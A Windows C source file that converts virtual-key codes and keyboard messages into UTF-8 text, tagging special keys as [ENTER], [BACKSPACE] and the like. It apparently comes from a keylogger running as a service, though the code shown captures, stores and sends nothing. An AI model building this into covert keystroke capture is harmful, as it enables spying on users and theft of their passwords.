#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 // Define Windows 10/11
#endif
#pragma warning(push)
#pragma warning(disable: 4668) // Desativa avisos de macros do Windows SDK
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shellapi.h>
#pragma warning(pop)

#include <windows.h>
#include <string.h>
#include "keyboard.h"
#include "service.h"

static BYTE keyboard_state[256] = {0};


static void update_keyboard_state(
    DWORD vk_code,
    WPARAM message
)
{
    BYTE value;

    value = 0;

    if (message == WM_KEYDOWN || message == WM_SYSKEYDOWN)
    {
        value = 0x80;
    }

    switch (vk_code)
    {
        case VK_LSHIFT:
        case VK_RSHIFT:
        case VK_SHIFT:
            keyboard_state[VK_SHIFT] = value;
            keyboard_state[VK_LSHIFT] = value;
            keyboard_state[VK_RSHIFT] = value;
            break;

        case VK_LCONTROL:
        case VK_RCONTROL:
        case VK_CONTROL:
            keyboard_state[VK_CONTROL] = value;
            keyboard_state[VK_LCONTROL] = value;
            keyboard_state[VK_RCONTROL] = value;
            break;

        case VK_LMENU:
        case VK_RMENU:
        case VK_MENU:
            keyboard_state[VK_MENU] = value;
            keyboard_state[VK_LMENU] = value;
            keyboard_state[VK_RMENU] = value;
            break;

        default:
            keyboard_state[vk_code] = value;
            break;
    }
}


static void update_toggle_keys(void)
{
    if (GetKeyState(VK_CAPITAL) & 0x0001)
    {
        keyboard_state[VK_CAPITAL] |= 0x01;
    }
    else
    {
        keyboard_state[VK_CAPITAL] &= ~0x01;
    }

    if (GetKeyState(VK_NUMLOCK) & 0x0001)
    {
        keyboard_state[VK_NUMLOCK] |= 0x01;
    }
    else
    {
        keyboard_state[VK_NUMLOCK] &= ~0x01;
    }
}


BOOL keyboard_translate(
    DWORD vk_code,
    WPARAM message,
    char *buffer,
    int size
)
{
    WCHAR unicode[4] = {0};
    HKL layout;
    int result;

    if (buffer == NULL || size <= 0)
        return FALSE;

    buffer[0] = '\0';

    update_keyboard_state(
        vk_code,
        message
    );

    update_toggle_keys();

    layout = GetKeyboardLayout(0);

    result = ToUnicodeEx(
        vk_code,
        MapVirtualKey(
            vk_code,
            MAPVK_VK_TO_VSC
        ),
        keyboard_state,
        unicode,
        4,
        0,
        layout
    );

    if (result > 0)
    {
        int converted;

        converted = WideCharToMultiByte(
            CP_UTF8,
            0,
            unicode,
            result,
            buffer,
            size - 1,
            NULL,
            NULL
        );

        if (converted > 0)
        {
            buffer[converted] = '\0';
            return TRUE;
        }
    }

    switch (vk_code)
    {
        case VK_RETURN:
            strcpy_s(buffer, size, "[ENTER]");
            return TRUE;

        case VK_BACK:
            strcpy_s(buffer, size, "[BACKSPACE]");
            return TRUE;

        case VK_TAB:
            strcpy_s(buffer, size, "[TAB]");
            return TRUE;

        case VK_SPACE:
            strcpy_s(buffer, size, " ");
            return TRUE;

        case VK_ESCAPE:
            strcpy_s(buffer, size, "[ESC]");
            return TRUE;

        default:
            return FALSE;
    }
}